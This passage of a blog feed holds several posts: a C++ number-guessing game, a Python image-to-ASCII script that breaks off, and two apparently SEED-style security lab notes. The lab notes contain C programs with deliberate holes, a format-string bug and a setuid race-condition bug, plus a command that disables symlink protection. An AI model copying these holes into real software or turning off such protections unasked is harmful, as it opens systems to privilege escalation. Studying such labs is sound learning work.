class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> num_digits = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> count_nums = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> match;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getNum</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; str;</span><br><span class="line">        <span class="keyword">if</span> (str.length() != num_digits) {</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your input format error!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input a &quot;</span> &lt;&lt; num_digits &lt;&lt; <span class="string">&quot;digits number.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); ++i) {</span><br><span class="line">            <span class="keyword">if</span> (str[i] &lt; <span class="string">&apos;0&apos;</span> || str[i] &gt; <span class="string">&apos;9&apos;</span>) {</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your input format error!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input a &quot;</span> &lt;&lt; num_digits &lt;&lt; <span class="string">&quot;digits number.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (flag) </span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getGoalNum</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (s.size() != num_digits) {</span><br><span class="line">        <span class="keyword">int</span> random_number = <span class="built_in">std</span>::rand() % <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> (s.size() == num_digits<span class="number">-1</span> &amp;&amp; random_number == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        s.insert(random_number);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">string</span> goal_num = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = s.begin(); it != s.end(); ++it) {</span><br><span class="line">        goal_num = to_string(*it) + goal_num;</span><br><span class="line">    }</span><br><span class="line">    s.clear();</span><br><span class="line">    <span class="keyword">return</span> goal_num;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmp</span><span class="params">(<span class="built_in">string</span> guess_num, <span class="built_in">string</span> goal_num)</span> </span>{</span><br><span class="line">    <span class="keyword">int</span> len1 = guess_num.length();</span><br><span class="line">    <span class="keyword">int</span> len2 = goal_num.length();</span><br><span class="line">    <span class="built_in">string</span> str1 = guess_num;</span><br><span class="line">    <span class="built_in">string</span> str2 = goal_num;</span><br><span class="line">    <span class="keyword">bool</span> flag;</span><br><span class="line">    match = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; ++i) {</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len2; ++j) {</span><br><span class="line">            <span class="keyword">if</span> (i == j &amp;&amp; str1[i] == str2[j]) {</span><br><span class="line">                v.push_back(<span class="string">&quot;Fermi&quot;</span>);</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            } <span class="keyword">else</span> <span class="keyword">if</span> (str1[i] == str2[j]) {</span><br><span class="line">                v.push_back(<span class="string">&quot;Pico&quot;</span>);</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (flag) {</span><br><span class="line">            v.push_back(<span class="string">&quot;Bagels&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    sort(v.begin(), v.end());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.size(); ++i) {</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; v[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (v[i] == <span class="string">&quot;Fermi&quot;</span>)</span><br><span class="line">            match++;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;    </span><br><span class="line">    <span class="keyword">if</span> (match == num_digits)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You get it!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    v.clear();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am thinking of a &quot;</span> &lt;&lt; num_digits &lt;&lt; <span class="string">&quot;-digit number. Try to guess what it is.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The clues I give are...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;When I say:    That means:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Bagels       None of the digits is correct.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Pico         One digit is correct but in the wrong position.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Fermi        One digit is correct and in the right position.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">string</span> try_again;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">        <span class="keyword">int</span> times = count_nums;</span><br><span class="line">        <span class="built_in">string</span> goal_num = getGoalNum();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;goal_num&quot;</span> &lt;&lt; goal_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">while</span> (times--) {</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Case #&quot;</span> &lt;&lt; times &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">string</span> guess_num = getNum();</span><br><span class="line">            cmp(guess_num, goal_num);</span><br><span class="line">            <span class="keyword">if</span> (match == num_digits)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (times == <span class="number">-1</span> &amp;&amp; match != num_digits) {</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You fail!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The answer is &quot;</span> &lt;&lt; goal_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Do you want to try again?(yes/y): &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; try_again;</span><br><span class="line">        <span class="keyword">if</span> (try_again[<span class="number">0</span>] == <span class="string">&apos;y&apos;</span> || try_again[<span class="number">0</span>] == <span class="string">&apos;Y&apos;</span>) {</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Begin a new game:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }   </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> c++ </category>
          
          <category> game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> c++ </tag>
            
            <tag> game </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Format string vulnerability experiment</title>
      <link href="/2018/10/03/Format-string-vulnerability-experiment/"/>
      <url>/2018/10/03/Format-string-vulnerability-experiment/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1525930213418.png" alt=""><br><a id="more"></a><br>code:<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vul_prog.c */</span> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECRET1 0x44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECRET2 0x55</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> user_input[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> *secret;</span><br><span class="line">  <span class="keyword">long</span> int_input;</span><br><span class="line">  <span class="keyword">int</span> a, b, c, d; <span class="comment">/* other variables, not used here.*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The secret value is stored on the heap */</span></span><br><span class="line">  secret = (<span class="keyword">int</span> *) <span class="built_in">malloc</span>(<span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* getting the secret */</span></span><br><span class="line">  secret[<span class="number">0</span>] = SECRET1; secret[<span class="number">1</span>] = SECRET2;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The variable secret&apos;s address is 0x%8x (on stack)\n&quot;</span>, &amp;secret);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The variable secret&apos;s value is 0x%8x (on heap)\n&quot;</span>, secret);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[0]&apos;s address is 0x%8x (on heap)\n&quot;</span>, &amp;secret[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[1]&apos;s address is 0x%8x (on heap)\n&quot;</span>, &amp;secret[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter a decimal integer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;int_input);  <span class="comment">/* getting an input from user */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter a string\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user_input); <span class="comment">/* getting a string from user */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Vulnerable place */</span></span><br><span class="line">  <span class="built_in">printf</span>(user_input);  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Verify whether your attack is successful */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The original secrets: 0x%x -- 0x%x\n&quot;</span>, SECRET1, SECRET2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The new secrets:      0x%x -- 0x%x\n&quot;</span>, secret[<span class="number">0</span>], secret[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x505A;&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F53;&#x6211;&#x51C6;&#x5907;&#x5BFB;&#x627E;secret[1]&#x7684;&#x5730;&#x5740;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6309;&#x7167;&#x6559;&#x7A0B;&#x5E94;&#x8BE5;&#x5E94;&#x8BE5;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x7684;&#x7ED3;&#x679C;&#x4F46;&#x662F;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x548C;&#x4ED6;&#x7684;&#x597D;&#x50CF;&#x4E0D;&#x592A;&#x4E00;&#x6837;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/wm.png" alt=""></p><p>&#x6211;&#x7684;&#x7ED3;&#x679C;&#xFF1A;</p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-03%2016-31-40.png" alt=""></p><p>&#x603B;&#x4E4B;&#xFF0C;&#x8FD8;&#x662F;&#x5BF9;&#x683C;&#x5F0F;&#x5316;&#x6F0F;&#x6D1E;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x7A81;&#x7136;&#x5F00;&#x59CB;&#x6000;&#x7591;&#x81EA;&#x505A;&#x7684;&#x8FD9;&#x4E9B;&#x4E8B;&#x60C5;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x610F;&#x4E49;&#x3002;&#x4E5F;&#x53D1;&#x73B0;&#x539F;&#x6765;hacker&#x5E76;&#x4E0D;&#x662F;&#x90A3;&#x4E48;&#x5BB9;&#x6613;&#x5C31;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x5F88;&#x9AD8;&#x7684;&#x6C34;&#x5E73;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Race condition vulnerability experiment</title>
      <link href="/2018/10/02/Race-condition-vulnerability-experiment/"/>
      <url>/2018/10/02/Race-condition-vulnerability-experiment/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1525930945137.png" alt=""></p><a id="more"></a><p>&#x7ADE;&#x6001;&#x6761;&#x4EF6;&#x6F0F;&#x6D1E;&#x5B9E;&#x9A8C;</p><blockquote><p>$ sudo su<br>$ echo 0 &gt; /proc/sys/fs/protected_symlinks<br>$ exit</p></blockquote><blockquote><p>fs.protected_symlinks<br>&#x7528;&#x4E8E;&#x9650;&#x5236;&#x666E;&#x901A;&#x7528;&#x6237;&#x5EFA;&#x7ACB;&#x8F6F;&#x94FE;&#x63A5;<br>0&#xFF1A;&#x4E0D;&#x9650;&#x5236;&#x7528;&#x6237;&#x5EFA;&#x7ACB;&#x8F6F;&#x94FE;&#x63A5;<br>1&#xFF1A;&#x9650;&#x5236;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x5EFA;&#x7ACB;&#x8F6F;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x662F; &#x8F6F;&#x8FDE;&#x63A5;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x662F;&#x5168;&#x5C40;&#x53EF;&#x8BFB;&#x5199;&#x76EE;&#x5F55;&#x6216;&#x8005;&#x8F6F;&#x8FDE;&#x63A5;&#x7684;uid&#x4E0E;&#x8DDF;&#x4ECE;&#x8005;&#x7684;uid&#x5339;&#x914D;&#xFF0C;&#x53C8;&#x6216;&#x8005;&#x76EE;&#x5F55;&#x6240;&#x6709;&#x8005;&#x4E0E;&#x8F6F;&#x8FDE;&#x63A5;&#x6240;&#x6709;&#x8005;&#x5339;&#x914D;</p></blockquote><blockquote><p>$ cd /home/shiyanlou/seed<br>$ sudo vi vulp.c</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vulp.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELAY 10000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">60</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">/* get user input */</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line">    <span class="keyword">if</span>(!access(fn, W_OK)){</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; DELAY; i++){</span><br><span class="line">            <span class="keyword">int</span> a = i^<span class="number">2</span>;</span><br><span class="line">        }</span><br><span class="line">        fp = fopen(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">        fwrite(buffer, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x5B9E;&#x9A8C;1: &#x5229;&#x7528;&#x7ADE;&#x6001;&#x6761;&#x4EF6;&#x6F0F;&#x6D1E;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br><span class="line">-rw-rw-r-- 1 shiyanlou shiyanlou   10 Apr 23 13:33 append_text  &#x300A;--VULP&#x8F93;&#x5165;&#x6587;&#x4EF6;</span><br><span class="line">-rw-rw-r-- 1 root      root         0 Apr 23 13:32 root_file  &#x300A;--&#x76EE;&#x6807;&#x6587;&#x4EF6;</span><br><span class="line">-rw-rw-r-- 1 shiyanlou shiyanlou    0 Apr 23 13:45 tmp_file  &#x300A;--&#x52A9;&#x653B;</span><br><span class="line">-rwsr-xr-x 1 root      root      7403 Apr 23 13:27 vulp  &#x300A;--&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;</span><br><span class="line">-rw-r--r-- 1 root      root       454 Apr 23 13:27 vulp.c</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><blockquote><p>$ sudo gcc vulp.c -o vulp</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python image convert string</title>
      <link href="/2018/10/02/Python-image-convert-string/"/>
      <url>/2018/10/02/Python-image-convert-string/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/ncn370.jpg" alt=""><br><a id="more"></a></p><p>&#x901A;&#x8FC7;&#x5E94;&#x7528;<a href="https://pillow-cn.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">pillow</a>&#x5E93;&#x548C;<a href="https://blog.ixxoo.me/argparse.html" target="_blank" rel="noopener">Argparse</a>&#x5E93;&#x6765;&#x5B9E;&#x73B0;&#x56FE;&#x7247;&#x8F6C;&#x5B57;&#x7B26;&#x753B;&#x7684;&#x529F;&#x80FD;&#x3002;</p><p>code:<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x547D;&#x4EE4;&#x884C;&#x8F93;&#x5165;&#x53C2;&#x6570;&#x5904;&#x7406;</span></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&apos;file&apos;</span>)     <span 